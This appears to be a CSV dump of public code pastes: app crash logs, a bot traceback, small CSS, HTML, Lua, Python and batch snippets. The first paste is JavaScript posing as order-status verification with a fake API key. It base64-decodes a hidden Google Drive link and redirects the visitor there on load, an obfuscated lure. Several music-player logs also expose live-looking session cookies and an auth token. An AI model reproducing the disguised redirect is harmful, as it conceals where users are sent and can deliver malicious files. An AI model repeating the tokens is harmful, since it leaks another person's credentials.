id,title,username,language,date,content
wPy11T73,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:33:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10219/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iL7e5Ha1,2025-05-28T18:02:18.405967,powerampache,PHP,Wednesday 28th of May 2025 06:02:19 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""timeout\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""timeout\"" }"",""stackTrace"":[]}"
GxwgpHSd,2025-05-29T07:57:38.498878,powerampache,PHP,Wednesday 28th of May 2025 05:57:40 PM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 404
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError Invalid response code 404 - Not Found - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 404 - Not Found
 {""headerFields"":{""null"":[""HTTP/1.1 404 Not Found""],""Cache-Control"":[""no-cache, no-store, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""1006""],""Content-Security-Policy"":[""default-src \u0027none\u0027;base-uri \u0027none\u0027;manifest-src \u0027self\u0027;frame-ancestors \u0027none\u0027""],""Content-Type"":[""application/json; charset\u003dutf-8""],""Date"":[""Wed, 28 May 2025 22:57:35 GMT""],""Feature-Policy"":[""autoplay \u0027none\u0027;camera \u0027none\u0027;fullscreen \u0027none\u0027;geolocation \u0027none\u0027;microphone \u0027none\u0027;payment \u0027none\u0027""],""Keep-Alive"":[""timeout\u003d5, max\u003d100""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache/2.4.62 (AlmaLinux) OpenSSL/3.2.2""],""Set-Cookie"":[""oc_sessionPassphrase\u003dTIlsGepuInXsVWTTyk7Hko5YBgXxghnbaBuHojyABMSbBAkAF13UwOqFOjzsv9Lq8KEEgmhAs7c%2BR93WqB2nObhH7T6V8uQ0chWYAc75H7TwgyAzlyFIgrXQs0IsdetN; path\u003d/; secure; HttpOnly; SameSite\u003dLax"",""__Host-nc_sameSiteCookielax\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dlax"",""__Host-nc_sameSiteCookiestrict\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dstrict"",""ochcpj79q18g\u003djm1kjbu3ud2ipi4ig1t34ostdb; path\u003d/; secure; HttpOnly; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d15768000""],""Vary"":[""Accept-Encoding""],""X-Android-Received-Millis"":[""1748473054734""],""X-Android-Response-Source"":[""NETWORK 404""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1748473054520""],""X-Content-Type-Options"":[""nosniff""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Powered-By"":[""PHP/8.3.21""],""X-Request-Id"":[""aDeU3wJbnWE5NfOOg3sIZAAAAI8""],""X-Robots-Tag"":[""noindex, nofollow""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[123,34,109,101,115,115,97,103,101,34,58,34,68,105,100,32,101,120,112,101,99,116,32,111,110,101,32,114,101,115,117,108,116,32,98,117,116,32,102,111,117,110,100,32,110,111,110,101,32,119,104,101,110,32,101,120,101,99,117,116,105,110,103,58,32,113,117,101,114,121,32,92,34,83,69,76,69,67,84,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,42,44,32,96,102,105,108,101,96,46,96,110,97,109,101,96,32,65,83,32,96,102,105,108,101,110,97,109,101,96,44,32,96,102,105,108,101,96,46,96,115,105,122,101,96,44,32,96,102,105,108,101,96,46,96,109,116,105,109,101,96,32,65,83,32,96,102,105,108,101,95,109,111,100,95,116,105,109,101,96,44,32,96,102,105,108,101,96,46,96,112,97,114,101,110,116,96,32,65,83,32,96,102,111,108,100,101,114,95,105,100,96,44,92,110,92,116,92,116,92,116,92,116,92,116,92,116,96,97,108,98,117,109,96,46,96,110,97,109,101,96,32,65,83,32,96,97,108,98,117,109,95,110,97,109,101,96,44,32,96,97,114,116,105,115,116,96,46,96,110,97,109,101,96,32,65,83,32,96,97,114,116,105,115,116,95,110,97,109,101,96,44,32,96,103,101,110,114,101,96,46,96,110,97,109,101,96,32,65,83,32,96,103,101,110,114,101,95,110,97,109,101,96,92,110,92,116,92,116,92,116,92,116,70,82,79,77,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,102,105,108,101,99,97,99,104,101,96,32,96,102,105,108,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,102,105,108,101,95,105,100,96,32,61,32,96,102,105,108,101,96,46,96,102,105,108,101,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,108,98,117,109,115,96,32,96,97,108,98,117,109,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,108,98,117,109,95,105,100,96,32,61,32,96,97,108,98,117,109,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,114,116,105,115,116,115,96,32,96,97,114,116,105,115,116,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,114,116,105,115,116,95,105,100,96,32,61,32,96,97,114,116,105,115,116,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,76,69,70,84,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,103,101,110,114,101,115,96,32,96,103,101,110,114,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,103,101,110,114,101,95,105,100,96,32,61,32,96,103,101,110,114,101,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,87,72,69,82,69,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,117,115,101,114,95,105,100,96,32,61,32,63,32,65,78,68,32,40,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,105,100,96,32,61,32,63,41,32,92,34,59,32,112,97,114,97,109,101,116,101,114,115,32,65,114,114,97,121,92,110,40,92,110,32,32,32,32,91,48,93,32,61,92,117,48,48,51,69,32,97,114,97,107,117,115,97,92,110,32,32,32,32,91,49,93,32,61,92,117,48,48,51,69,32,51,49,48,50,57,92,110,41,92,110,59,32,108,105,109,105,116,32,92,34,92,34,59,32,111,102,102,115,101,116,32,92,34,92,34,34,125],""responseCode"":404,""responseMessage"":""Not Found"",""dataSpec"":{""absoluteStreamPosition"":17380736,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://cloud.arakusa.net/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d09510515a4a672d6bd636721a149c3a5\u0026type\u003dsong\u0026id\u003d31029"",""length"":2736833,""position"":17380736,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 404"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]}"
nBD2EzTJ,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Wednesday 28th of May 2025 05:46:01 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
kM2AdTVv,Hide Google AI overview (May 2025),sawczakl,CSS,Wednesday 28th of May 2025 04:56:31 PM CDT,"/*
1. Go to your browser extensions and add Live Editor for CSS

2. Run a Google search

3. Open the extension

4. Paste in the below code

5. Click the pin icon

6. You can close the extension window 
*/

div[data-al=""AI overview is ready""] {
    display: none;
}
"
Kz8Mk5FE,2025-05-28T22:52:25.664433,powerampache,PHP,Wednesday 28th of May 2025 03:52:25 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9634)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}"
gTK7qJyc,2025-05-28T22:52:05.808064,powerampache,PHP,Wednesday 28th of May 2025 03:52:05 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""mine.p2d.moe"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
py4WBfvx,Global Window Alert System,Th3Ward3n,HTML,Wednesday 28th of May 2025 03:42:21 PM CDT,"<div id=""alert-container"">
    <!-- ERROR -->
    <dialog id=""alert-error"" class=""a-error"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('error');"">Close</button>
        </div>
    </dialog>
    <!-- WARNING -->
    <dialog id=""alert-warning"" class=""a-warning"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('warning');"">Close</button>
        </div>
    </dialog>
    <!-- INFO -->
    <dialog id=""alert-info"" class=""a-info"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('info');"">Close</button>
        </div>
    </dialog>
    <!-- SUCCESS -->
    <dialog id=""alert-success"" class=""a-success"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('success');"">Close</button>
        </div>
    </dialog>
</div>
<script>
    /** @typedef {""error"" | ""warning"" | ""info"" | ""success""} ValidAlertTypes */
    const validAlertTypeList = [""error"", ""warning"", ""info"", ""success""];
    /** 
     * @param alertType {ValidAlertTypes}
     * @returns {HTMLDialogElement}
     */
    const findDialog = (alertType) => {
        const diaEle = document.querySelector(`dialog#alert-${alertType}`);
        if (!diaEle) throw new Error(`[WARNING] Failed to find Dialog with id alert-${alertType}!`);
        return diaEle;
    };

    class AlertManager {
        parentDialog;
        textContainer;
        /** @param alertType {ValidAlertTypes} */
        constructor(alertType) {
            this.parentDialog = findDialog(alertType);
            this.textContainer = Object.values(
                Object.values(this.parentDialog.childNodes)
                .find((child) => child instanceof HTMLDivElement).childNodes
            ).find((child) => child instanceof HTMLParagraphElement);
        }

        get dlog() { return this.parentDialog; }
        get isOpen() { return this.dlog.hasAttribute('open'); }
        /** @param txt {string} */
        set txtDisplay(txt) { this.textContainer.textContent = txt; }

        // TODO: Calculate position of prexisting dialog boxes currently `open`
        // Apply position shift to prevent overlap, accounting for translation distance to take up `closed` boxes
        show() { this.dlog.show(); }
        close() { this.dlog.close(); }
    }

    const dialogContainer = {
        error: new AlertManager('error'),
        warning: new AlertManager('warning'),
        info: new AlertManager('info'),
        success: new AlertManager('success')
    };

    /** @param alertType {ValidAlertTypes} */
    function dismissAlert(alertType) {
        console.log(alertType);
        if (dialogContainer[alertType].isOpen) dialogContainer[alertType].close();
    }

    
    window.addEventListener(""message"", (event) => {
        /** 
         * @typedef {
            {
               message: string,
               type: ValidAlertTypes 
            }
         } ValidMsgPayload 
         */
        if (event.origin !== ""http://127.0.0.1:4450"") return;
        /** @type {ValidMsgPayload} */
        const msgPayload = event.data;
        if (typeof msgPayload === 'string' || !validAlertTypeList.includes(msgPayload.type)) return;
        
        dialogContainer[msgPayload.type].txtDisplay = msgPayload.message;
        dialogContainer[msgPayload.type].show();

        setTimeout(() => { dialogContainer[msgPayload.type].close(); }, 4400);
    });
</script>"
CW70Wzee,Basic script,Thesxctriper23214,Lua,Wednesday 28th of May 2025 12:50:35 PM CDT,"--[[
Sprint Script
Features:
• Smooth acceleration/deceleration for walk ↔ sprint transitions
• Stamina management with depletion and regeneration
• Subtle camera roll (tilt) on sprint using local forward‐axis rotation
• Configurable parameters for speed, rates, and tilt
]]

local Players          = game:GetService(""Players"")
local RunService       = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")

local player    = Players.LocalPlayer
local camera    = workspace.CurrentCamera
local character, humanoid, rootPart

-- Configuration
local walkSpeed    = 16
local sprintSpeed  = 32
local accelRate    = 50       -- studs/s²
local decelRate    = 70       -- studs/s²
local maxStamina   = 5        -- seconds
local staminaDrain = 1        -- per second
local staminaRegen = 0.5      -- per second
local tiltAngle    = 5        -- degrees of roll
local tiltSpeed    = 10       -- interpolation speed

-- State
local currentSpeed = walkSpeed
local isSprinting  = false
local stamina      = maxStamina
local currentRoll  = 0        -- radians

-- Handle respawns
local function onCharacterAdded(char)
    character = char
    humanoid   = char:WaitForChild(""Humanoid"")
    rootPart   = char:WaitForChild(""HumanoidRootPart"")
    
    -- reset state
    currentSpeed = walkSpeed
    isSprinting  = false
    stamina      = maxStamina
    currentRoll  = 0
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(player.Character)
end

-- Detect sprint input
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = true
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = false
    end
end)

-- Main update loop
RunService.RenderStepped:Connect(function(dt)
    if not humanoid then return end

    local moving = humanoid.MoveDirection.Magnitude > 0

    -- Determine target speed
    local targetSpeed = (isSprinting and moving and stamina > 0)
        and sprintSpeed
        or walkSpeed

    -- Smooth acceleration/deceleration
    if currentSpeed < targetSpeed then
        currentSpeed = math.min(currentSpeed + accelRate * dt, targetSpeed)
    elseif currentSpeed > targetSpeed then
        currentSpeed = math.max(currentSpeed - decelRate * dt, targetSpeed)
    end
    humanoid.WalkSpeed = currentSpeed

    -- Stamina logic
    if isSprinting and moving and stamina > 0 then
        stamina = math.max(stamina - staminaDrain * dt, 0)
        if stamina == 0 then
            isSprinting = false
        end
    else
        stamina = math.min(stamina + staminaRegen * dt, maxStamina)
    end

    -- Improved camera roll tilt
    local targetRoll = (currentSpeed > walkSpeed + 0.1)
        and math.rad(tiltAngle)
        or 0
    local alpha     = math.clamp(tiltSpeed * dt, 0, 1)
    local deltaRoll = (targetRoll - currentRoll) * alpha

    if math.abs(deltaRoll) > 1e-4 then
        -- Rotate camera around its local forward axis
        camera.CFrame = camera.CFrame * CFrame.Angles(0, 0, deltaRoll)
        currentRoll = currentRoll + deltaRoll
    end
end)
"
mFLFK0wF,04. Search,Andonoff,Python,Wednesday 28th of May 2025 12:38:50 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element: # <- махаме елемента, в който думата я няма.
        data_list.remove(element)
        
print(data_list)"
MGKKFrE2,Untitled,Andonoff,Python,Wednesday 28th of May 2025 12:36:45 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element:
        data_list.remove(element)
    print(element)
print(data_list)"
YkNySMaz,DosBox - Win95 image,caffeine314,Batch,Wednesday 28th of May 2025 12:22:02 PM CDT,"@echo off

set ""DOSBOX_EXE=D:\Program Files\DOSBox-X\dosbox-x.exe""
set ""DOGDAY_DIR=E:\Gaming\DosBox\DogDay""
set ""WIN_ISO=WIN950~1.ISO""

:: A larger disk image (e.g., 500MB–2GB) that emulates a hard drive.  Acts as a
:: virtual C: drive where Win 95 will actually be installed and run.  Created with:
::    imgmake win95.img -t hd -chs 512,16,63 -size 500
set ""WIN_IMG=hdd.img""

:: A 1.44MB floppy image that emulates a bootable DOS disk.  Used to boot into DOS
